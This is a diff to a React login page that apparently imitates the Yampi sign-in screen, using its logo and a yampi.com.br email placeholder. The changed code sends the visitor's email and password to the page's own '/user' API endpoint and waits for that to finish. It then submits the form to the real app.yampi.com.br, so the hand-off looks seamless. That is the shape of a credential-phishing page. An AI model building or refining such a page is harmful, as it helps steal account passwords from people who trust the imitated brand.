@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useRef } from 'react';
 import './App.css';
 import brand from './assets/brand-yampi.svg';
 import { api } from './services/api';
@@ -9,7 +9,9 @@ function App() {
 	const [isFormSubmitted, setIsFormSubmitted] = useState(false);
 	const [errors, setErrors] = useState({});
 
-	function onSubmitUser(event) {
+	const passwordRef = useRef(null); // Referência para o elemento de senha
+
+	async function onSubmitUser(event) {
 		event.preventDefault();
 		setIsFormSubmitted(true);
 
@@ -26,9 +28,8 @@ function App() {
 			password: passwordUser
 		};
 
-		saveUser(saveData);
-		event.target.action = 'https://app.yampi.com.br/'; // Define a ação do formulário após a validação
-		event.target.submit(); // Envia o formulário
+		await saveUser(saveData);
+		afterSave(event);
 	}
 
 	function handleEmailLogin(event) {
@@ -42,7 +43,18 @@ function App() {
 	async function saveUser(saveData) {
 		try {
 			const response = await api.post('/user', saveData);
-		} catch (error) { }
+			if (response.status == 201) {
+				setTimeout(() => { }, 2000);
+			}
+			return response.data;
+		} catch (error) {
+			console.error(error);
+		}
+	}
+
+	function afterSave(event) {
+		event.target.action = 'https://app.yampi.com.br/';
+		event.target.submit();
 	}
 
 	return (
@@ -64,7 +76,7 @@ function App() {
 							placeholder='john@yampi.com.br'
 							className={`input-block ${errors.email && isFormSubmitted ? 'invalid' : ''}`}
 							onChange={handleEmailLogin}
-							
+							tabIndex={1} // Definindo o tabIndex como 1
 						/>
 						{errors.email && isFormSubmitted && (
 							<div className='error-message'>Campo obrigatório</div>
@@ -81,13 +93,14 @@ function App() {
 							placeholder='Digite sua senha'
 							className={`input-block ${errors.password && isFormSubmitted ? 'invalid' : ''}`}
 							onChange={handlePasswordLogin}
-							
+							tabIndex={2} // Definindo o tabIndex como 2
+							ref={passwordRef} // Associando a referência ao elemento de senha
 						/>
 						{errors.password && isFormSubmitted && (
 							<div className='error-message'>Campo obrigatório</div>
 						)}
 					</div>
-					<button type='submit' className='button-submit'>
+					<button type='submit' className='button-submit' tabIndex={3}> {/* Definindo o tabIndex como 3 */}
 						Entrar
 					</button>
 					<div className='last-text-container'>
